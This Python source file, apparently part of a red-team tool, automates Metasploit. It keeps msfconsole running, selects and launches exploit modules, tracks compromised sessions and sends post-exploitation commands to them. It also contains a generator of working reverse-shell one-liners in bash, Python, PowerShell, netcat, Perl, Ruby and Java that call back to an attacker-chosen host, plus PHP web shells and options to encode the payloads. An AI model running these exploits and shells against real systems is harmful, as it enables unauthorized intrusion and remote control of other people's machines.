"""
COMPLETE METASPLOIT INTEGRATION WITH PERSISTENT SESSION
"""
import asyncio
import tempfile
import os
import shutil
import re
import time
from typing import Dict, Any, List

class CompleteMetasploit:
    """Complete Metasploit control with persistent session"""
    
    def __init__(self):
        self.msf_path = shutil.which("msfconsole")
        self.active_module = None
        self.module_options = {}
        self.active_payload = None
        self.sessions = {}
        
        # Persistent process
        self.process = None
        self.msf_ready = False
    
    def is_available(self):
        """Check if Metasploit is installed"""
        return self.msf_path is not None
    
    def msf_exists(self):
        """Compatibility method"""
        return self.is_available()
    
    async def ensure_running(self):
        """Ensure msfconsole is running persistently"""
        if self.process and self.process.returncode is None:
            return True
        
        if not self.is_available():
            return False
        
        try:
            # Start msfconsole with quiet mode
            self.process = await asyncio.create_subprocess_shell(
                f"{self.msf_path} -q",
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            
            # Wait for msfconsole to be ready
            await self._wait_for_prompt()
            self.msf_ready = True
            return True
            
        except Exception as e:
            print(f"Failed to start msfconsole: {e}")
            return False




    async def _wait_for_prompt(self):
        buffer = ""
        while True:
            chunk = await self.process.stdout.read(1024)
            if not chunk:
                continue

            buffer += chunk.decode(errors="ignore")
            if "msf" in buffer and ">" in buffer:
                break

    async def _read_until_marker(self, marker: str, timeout: int = 25):
        buffer = ""
        start = time.time()

        while True:
            if time.time() - start > timeout:
                break

            chunk = await self.process.stdout.read(1024)
            if not chunk:
                continue

            text = chunk.decode(errors="ignore")
            buffer += text

            if marker in buffer:
                break

        return buffer

    async def execute_command_persistent(self, command: str, timeout: int = 25):

        if not await self.ensure_running():
            return {"success": False, "error": "Failed to start msfconsole"}

        marker = f"__REDOPS_END_{int(time.time()*1000)}__"

        payload = f"""
echo __REDOPS_START__
{command}
echo {marker}
"""

        self.process.stdin.write(payload.encode())
        await self.process.stdin.drain()

        raw = await self._read_until_marker(marker, timeout)
        raw = raw.replace("__REDOPS_START__", "")
        raw = raw.replace(marker, "")

        self._update_sessions(raw)

        # -------------------------------
        # AUTO‑SYNC MODULE / OPTIONS
        # -------------------------------
        cmd = command.strip()

        if cmd.startswith("use "):
            self.active_module = cmd.split(" ", 1)[1]
            self.module_options = {}
            self.active_payload = None

        elif cmd.startswith("set "):
            parts = cmd.split()
            if len(parts) >= 3:
                opt = parts[1].upper()
                val = " ".join(parts[2:])
                if opt == "PAYLOAD":
                    self.active_payload = val
                else:
                    self.module_options[opt] = val

        return {
            "success": True,
            "output": raw.strip(),
            "error": ""
        }


    async def execute_commands_persistent(self, commands: List[str]) -> Dict[str, Any]:

        all_output = []

        for cmd in commands:
            result = await self.execute_command_persistent(cmd)
            if result.get("output"):
                all_output.append(result["output"])

        return {
            "success": True,
            "output": "\n".join(all_output),
            "error": ""
        }

    
    async def run_one_post_cmd(self, session_id: str, command: str, timeout: int = 15):
        """
        Execute ONE post-exploitation command in a C2-safe way.
        No interactive shell. No freeze.
        """

        if not await self.ensure_running():
            return {"success": False, "error": "Failed to start msfconsole"}

        marker = f"__POST_END_{int(time.time()*1000)}__"
        cmd = f'sessions -i {session_id} -c "{command}; echo {marker}"\n'

        self.process.stdin.write(cmd.encode())
        await self.process.stdin.drain()

        buffer = ""
        start = time.time()

        while True:
            if time.time() - start > timeout:
                break

            chunk = await self.process.stdout.read(1024)
            if not chunk:
                await asyncio.sleep(0.05)
                continue

            text = chunk.decode(errors="ignore")
            buffer += text

            if marker in buffer:
                break

        # clean output
        buffer = buffer.replace(marker, "")
        buffer = re.sub(r"msf\d+.*?>", "", buffer, flags=re.I)
        buffer = re.sub(r"\[\*\].*?session.*", "", buffer, flags=re.I)

        self._update_sessions(buffer)

        return {
            "success": True,
            "output": buffer.strip(),
            "error": ""
        }    
    
    
    
    def _update_sessions(self, output: str):
        """Update session list from output"""
        lines = output.split('\n')
        for line in lines:
            if "Session" in line and ("Meterpreter" in line or "shell" in line):
                match = re.search(r'Session\s+(\d+)', line)
                if match:
                    session_id = match.group(1)
                    session_type = "meterpreter" if "Meterpreter" in line else "shell"
                    target_match = re.search(r'\((.*?)\)', line)
                    target = target_match.group(1) if target_match else "unknown"
                    
                    self.sessions[session_id] = {
                        "id": session_id,
                        "type": session_type,
                        "target": target,
                        "info": line.strip()
                    }
    
    async def stop_exploit(self) -> Dict[str, Any]:
        return await self.execute_commands_persistent([
            "jobs -K"
        ])

    
    # Public methods - use persistent versions
    async def execute_command(self, command: str, timeout: int = 60) -> Dict[str, Any]:
        """Execute single command"""
        return await self.execute_command_persistent(command)
    
    async def execute_commands(self, commands: List[str], timeout: int = 120) -> Dict[str, Any]:
        """Execute multiple commands"""
        return await self.execute_commands_persistent(commands)
    
    async def search_modules(self, keyword: str = "") -> Dict[str, Any]:
        """Search for modules"""
        search_cmd = f"search {keyword}" if keyword else "search"
        return await self.execute_command(search_cmd)
    
    async def use_module(self, module_path: str) -> Dict[str, Any]:
        """Select a module"""
        return await self.execute_command(f"use {module_path}")
    
    async def set_option(self, option: str, value: str) -> Dict[str, Any]:
        """Set a module option"""
        return await self.execute_command(f"set {option} {value}")
    
    async def show_options(self) -> Dict[str, Any]:
        """Show current module and payload options"""
        if not self.active_module:
            return {"success": False, "error": "No module selected"}
        
        # Get module options
        module_result = await self.execute_command("show options")
        
        # Get payload options if payload is set
        payload_result = {"success": True, "output": ""}
        if self.active_payload:
            payload_result = await self.execute_command("show payload")
        
        # Combine results
        combined_output = ""
        if module_result["success"] and module_result.get("output"):
            combined_output += "=== MODULE OPTIONS ===\n"
            combined_output += module_result["output"]
        
        if payload_result["success"] and payload_result.get("output"):
            combined_output += "\n=== PAYLOAD OPTIONS ===\n"
            combined_output += payload_result["output"]
        
        return {
            "success": module_result["success"],
            "output": combined_output,
            "error": module_result.get("error", "")
        }
    
    async def show_payloads(self) -> Dict[str, Any]:
        """Show available payloads"""
        return await self.execute_command("show payloads")
    
    async def set_payload(self, payload: str) -> Dict[str, Any]:
        """Set payload for current module"""
        return await self.execute_command(f"set payload {payload}")
    
    async def run_exploit(self) -> Dict[str, Any]:
        """Run the current exploit safely"""
        if not self.active_module:
            return {"success": False, "error": "No module selected"}

        # Always re‑select module
        await self.execute_command(f"use {self.active_module}")

        # Re‑apply options
        for opt, val in self.module_options.items():
            await self.execute_command(f"set {opt} {val}")

        # Re‑apply payload
        if self.active_payload:
            await self.execute_command(f"set payload {self.active_payload}")

        # Run in background (prevents freeze)
        result = await self.execute_command("run -j")

        return result
        
    
    async def list_sessions(self) -> Dict[str, Any]:
        """List all active sessions"""
        return await self.execute_command("sessions")
    
    async def interact_session(self, *args, **kwargs):
        return {
            "success": False,
            "error": "Interactive sessions are disabled. Use run_one_post_cmd()."
        }

    
    async def kill_session(self, session_id: str) -> Dict[str, Any]:
        """Kill a session"""
        return await self.execute_command(f"sessions -k {session_id}")
    
    async def get_module_info(self, module_path: str = None) -> Dict[str, Any]:
        """Get info about a module"""
        module = module_path or self.active_module
        if not module:
            return {"success": False, "error": "No module specified"}
        return await self.execute_command(f"info {module}")
    
    async def check_jobs(self) -> Dict[str, Any]:
        """Check active jobs"""
        return await self.execute_command("jobs")
    
    # Payload generation (keep your existing)
    def generate_payload(self, ptype: str, lhost: str, lport: str, format: str = "raw") -> str:
        """Generate payloads"""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
            "powershell": f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """,
            "php": "<?php system($_GET['cmd']); ?>",
            "php_system": "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "perl": f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
            "ruby": f"""ruby -rsocket -e 'c=TCPSocket.new("{lhost}",{lport});loop{{cmd=c.gets;IO.popen(cmd,"r"){{|io|c.print io.read}}}}'""",
            "java": f"""echo 'String host="{lhost}";int port={lport};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();' > /tmp/shell.java && javac /tmp/shell.java && java -cp /tmp shell""",
        }
        
        payload = payloads.get(ptype, f"Unknown payload type. Available: {', '.join(payloads.keys())}")
        
        if format == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        elif format == "url":
            import urllib.parse
            return urllib.parse.quote(payload)
        elif format == "hex":
            return payload.encode().hex()
        else:
            return payload
    
    def list_payload_types(self):
        """List available payload types"""
        return [
            "bash", "python", "powershell", "php", "php_system",
            "nc", "perl", "ruby", "java"
        ]


# Global instance
msf = CompleteMetasploit()
